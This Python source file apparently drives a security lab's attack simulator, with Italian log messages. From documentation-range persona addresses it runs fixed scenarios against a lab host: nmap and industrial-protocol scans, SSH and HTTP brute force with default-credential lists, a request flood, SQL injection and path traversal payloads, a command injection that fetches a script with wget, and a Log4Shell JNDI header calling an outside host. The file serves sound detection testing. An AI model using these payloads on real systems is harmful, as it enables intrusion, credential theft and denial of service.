"""The attacks of the lab: fixed, against lab-01 only, each from the address of a persona.

Every address is a documentation address (RFC 5737). The intrusion package gives each one an invented city (the
same table as the simulated mode), so the map shows where "the attackers" are. Nothing here takes a target or a
command from outside: the console can only pick one of these scenarios.
"""
import http.client
import os
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

TARGETS = {
    "198.51.100.": os.environ.get("TARGET_IT", "198.51.100.20"),
    "203.0.113.": os.environ.get("TARGET_INTERNET", "203.0.113.250"),
    "192.0.2.": os.environ.get("TARGET_HOMES", "192.0.2.250"),
}

# Persona addresses and the city the package gives them (Core/Simulation/SyntheticGeo).
PERSONAS = {
    "198.51.100.213": "Chișinău, Moldavia",
    "203.0.113.6": "Mosca, Russia",
    "203.0.113.7": "Seul, Corea del Sud",
    "203.0.113.9": "San Pietroburgo, Russia",
    "203.0.113.14": "Hong Kong",
    "203.0.113.15": "Dallas, Stati Uniti",
    "203.0.113.18": "San Paolo, Brasile",
    "203.0.113.20": "Shenzhen, Cina",
}
HOMES = [f"192.0.2.{n}" for n in range(11, 23)]

LAB_PASSWORD = "Alveo2026!"  # operatore's password on lab-01: a lab account, nowhere else.


def target_for(source):
    for prefix, target in TARGETS.items():
        if source.startswith(prefix):
            return target
    raise ValueError(f"{source} is not a lab address")


def iface_for(source):
    prefix = ".".join(source.split(".")[:3]) + "."
    out = subprocess.run(["ip", "-o", "-4", "addr", "show"], capture_output=True, text=True).stdout
    for line in out.splitlines():
        parts = line.split()
        if parts[3].startswith(prefix):
            return parts[1]
    raise RuntimeError(f"no interface for {source}")


# --- primitives -------------------------------------------------------------------------------------------------

def ssh_try(source, user, password, log, command="true"):
    """One SSH login from `source`. Returns 'ok', 'denied' or 'blocked' (no answer: banned or dropped)."""
    target = target_for(source)
    r = subprocess.run(
        ["sshpass", "-p", password, "ssh", "-b", source, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
         "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no", "-o", "NumberOfPasswordPrompts=1",
         "-o", "ConnectTimeout=4", "-o", "LogLevel=ERROR", f"{user}@{target}", command],
        capture_output=True, text=True, timeout=30)
    if r.returncode == 0:
        log(f"{source} → ssh {user}: ACCESSO RIUSCITO")
        for line in r.stdout.strip().splitlines()[:4]:
            log(f"    {line}")
        return "ok"
    if r.returncode == 5 or "Permission denied" in r.stderr:
        log(f"{source} → ssh {user}: password rifiutata")
        return "denied"
    log(f"{source} → ssh {user}: nessuna risposta (bloccato da fail2ban o dal firewall)")
    return "blocked"


def http_get(source, path, log=None, headers=None, quiet=False):
    """One GET from `source`, path sent as is (no normalisation: ../ stays ../). Returns the status or None."""
    target = target_for(source)
    try:
        conn = http.client.HTTPConnection(target, 80, timeout=4, source_address=(source, 0))
        conn.putrequest("GET", path, skip_accept_encoding=True)
        for k, v in (headers or {"User-Agent": "Mozilla/5.0"}).items():
            conn.putheader(k, v)
        conn.endheaders()
        status = conn.getresponse().status
        conn.close()
    except OSError:
        status = None
    if log and not quiet:
        log(f"{source} → GET {path[:70]}: {status if status else 'nessuna risposta (bloccato)'}")
    return status


def nmap(source, args, log):
    target = target_for(source)
    cmd = ["nmap", "-n", "-Pn", "-S", source, "-e", iface_for(source), "--max-retries", "1", *args, target]
    log(f"{source} → nmap {' '.join(args)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    open_ports = [l.split()[0] for l in r.stdout.splitlines() if "/tcp" in l and " open " in l]
    log(f"    porte aperte trovate: {', '.join(open_ports) if open_ports else 'nessuna'}")


# --- scenarios --------------------------------------------------------------------------------------------------

def port_scan(log):
    nmap("203.0.113.6", ["-sS", "--top-ports", "200", "-T4"], log)


def industrial_probe(log):
    nmap("203.0.113.7", ["-sS", "-p", "502,102,2404,20000,44818,4840,1911,1883", "-T4"], log)
    nmap("203.0.113.7", ["-sU", "-p", "47808", "-T4"], log)


def ssh_fast(log):
    src = "203.0.113.20"
    for user, pw in [("root", "123456"), ("root", "admin"), ("admin", "admin"), ("ubuntu", "ubuntu"), ("test", "test"),
                     ("root", "password"), ("oracle", "oracle"), ("pi", "raspberry"), ("root", "toor"), ("admin", "1234")]:
        ssh_try(src, user, pw, log)


def intrusion(log):
    src = "198.51.100.213"
    nmap(src, ["-sS", "--top-ports", "50", "-T4"], log)
    log("pausa: l'attaccante prova piano, sotto la soglia di fail2ban (5 tentativi in un minuto)")
    for pw in ["operatore", "Operatore1", "alveo2025", "Alveo2025!"]:
        ssh_try(src, "operatore", pw, log)
        time.sleep(16)
    ssh_try(src, "operatore", LAB_PASSWORD, log, command="id && uname -n && uptime")


def web_scan(log):
    src = "203.0.113.14"
    for path in ["/wp-login.php", "/.env", "/.git/config", "/phpmyadmin/", "/wp-admin/setup-config.php", "/xmlrpc.php",
                 "/backup.zip", "/server-status", "/actuator/env", "/cgi-bin/luci", "/shell.php", "/db.sql"]:
        http_get(src, path, log, {"User-Agent": "Mozilla/5.0 zgrab/0.x"})


def web_exploit(log):
    src = "203.0.113.9"
    http_get(src, "/index.php?id=1'%20OR%20'1'='1", log)
    http_get(src, "/index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users", log)
    http_get(src, "/../../../../etc/passwd", log)
    http_get(src, "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", log)
    http_get(src, "/cgi-bin/test.cgi?cmd=;wget%20http://203.0.113.9/x.sh", log)
    http_get(src, "/", log, {"User-Agent": "${jndi:ldap://203.0.113.9:1389/a}"})


def web_login(log):
    import base64
    src = "203.0.113.18"
    for user, pw in [("admin", "admin"), ("admin", "password"), ("admin", "alveo"), ("administrator", "admin"), ("root", "root"),
                     ("admin", "123456"), ("admin", "Alveo2026"), ("webmaster", "webmaster")]:
        token = base64.b64encode(f"{user}:{pw}".encode()).decode()
        http_get(src, "/admin/", log, {"User-Agent": "Mozilla/5.0", "Authorization": f"Basic {token}"})


def flood(log):
    src = "203.0.113.15"
    log(f"{src} → 300 richieste in pochi secondi")
    with ThreadPoolExecutor(max_workers=30) as pool:
        statuses = list(pool.map(lambda _: http_get(src, "/", quiet=True), range(300)))
    counts = {}
    for s in statuses:
        counts[s] = counts.get(s, 0) + 1
    log("    risposte: " + ", ".join(f"{k or 'nessuna'}×{v}" for k, v in sorted(counts.items(), key=lambda kv: str(kv[0]))))


def campaign(log):
    log("12 connessioni domestiche provano l'account scada, due volte ciascuna: nessuna supera la soglia")
    for src in HOMES:
        for pw in ["scada", "Scada2024"]:
            ssh_try(src, "scada", pw, log)


def full_night(log):
    for title, fn in [("Scansione delle porte", port_scan), ("Protocolli industriali", industrial_probe),
                      ("Scansione del sito", web_scan), ("Exploit web", web_exploit), ("Intrusione", intrusion)]:
        log(f"— {title} —")
        fn(log)


SCENARIOS = [
    {"id": "port-scan", "title": "Scansione delle porte", "source": "203.0.113.6", "run": port_scan,
     "expect": "Il firewall registra i tentativi sulle porte chiuse: PortScan, gravità media."},
    {"id": "industrial", "title": "Ricerca dei protocolli industriali", "source": "203.0.113.7", "run": industrial_probe,
     "expect": "Modbus, S7, IEC 104, DNP3, BACnet…: IndustrialProtocolProbe, gravità alta."},
    {"id": "ssh-fast", "title": "Forza bruta SSH veloce", "source": "203.0.113.20", "run": ssh_fast,
     "expect": "Dopo 5 tentativi fail2ban banna l'indirizzo: gli ultimi tentativi non ricevono risposta."},
    {"id": "intrusion", "title": "Intrusione lenta e accesso riuscito", "source": "198.51.100.213", "run": intrusion,
     "expect": "Scansione, 4 password sbagliate sotto la soglia, poi l'accesso: LoginAfterFailures, gravità critica."},
    {"id": "web-scan", "title": "Scansione del sito", "source": "203.0.113.14", "run": web_scan,
     "expect": "Richieste a .env, .git, WordPress, phpMyAdmin: WebVulnerabilityScan, ban di nginx-botsearch."},
    {"id": "web-exploit", "title": "Tentativi di exploit web", "source": "203.0.113.9", "run": web_exploit,
     "expect": "SQL injection, path traversal, PHPUnit, command injection, Log4Shell: WebExploitAttempt, gravità alta."},
    {"id": "web-login", "title": "Forza bruta sull'area riservata", "source": "203.0.113.18", "run": web_login,
     "expect": "Password sbagliate su /admin/: WebLoginBruteForce, ban di nginx-http-auth."},
    {"id": "flood", "title": "Flood di richieste", "source": "203.0.113.15", "run": flood,
     "expect": "nginx limita le richieste (429): RequestFlood, ban di nginx-limit-req."},
    {"id": "campaign", "title": "Campagna distribuita su un account", "source": "192.0.2.11–22", "run": campaign,
     "expect": "12 indirizzi, 2 tentativi ciascuno sull'account scada: nessun ban, una campagna DistributedSshBruteForce."},
    {"id": "full-night", "title": "La notte completa (in sequenza)", "source": "più indirizzi", "run": full_night,
     "expect": "Scansione, protocolli industriali, sito, exploit e infine l'intrusione: circa tre minuti."},
]


def describe():
    return [{"id": s["id"], "title": s["title"], "source": s["source"],
             "place": PERSONAS.get(s["source"], "connessioni domestiche" if s["id"] == "campaign" else "più città"),
             "expect": s["expect"]} for s in SCENARIOS]


class Runner:
    """One scenario at a time: the map is easier to read, and lab-01's bans stay attributable."""

    def __init__(self):
        self._lock = threading.Lock()
        self.runs = []
        self.current = None

    def start(self, scenario_id):
        scenario = next((s for s in SCENARIOS if s["id"] == scenario_id), None)
        if scenario is None:
            return None, "scenario sconosciuto"
        with self._lock:
            if self.current is not None:
                return None, f"è già in corso «{self.current['title']}»"
            run = {"id": len(self.runs) + 1, "scenario": scenario_id, "title": scenario["title"],
                   "started": time.strftime("%H:%M:%S"), "finished": None, "status": "in corso", "log": []}
            self.runs.append(run)
            self.runs = self.runs[-20:]
            self.current = run
        threading.Thread(target=self._run, args=(scenario, run), daemon=True).start()
        return run, None

    def _run(self, scenario, run):
        def log(msg):
            run["log"].append({"t": time.strftime("%H:%M:%S"), "msg": msg})
        try:
            scenario["run"](log)
            run["status"] = "finito"
        except Exception as ex:  # a failed scenario is reported in the console, never hidden
            log(f"errore: {ex}")
            run["status"] = "errore"
        finally:
            run["finished"] = time.strftime("%H:%M:%S")
            with self._lock:
                self.current = None


if __name__ == "__main__" and "--addresses" in sys.argv:
    for address in list(PERSONAS) + HOMES:
        print(address)
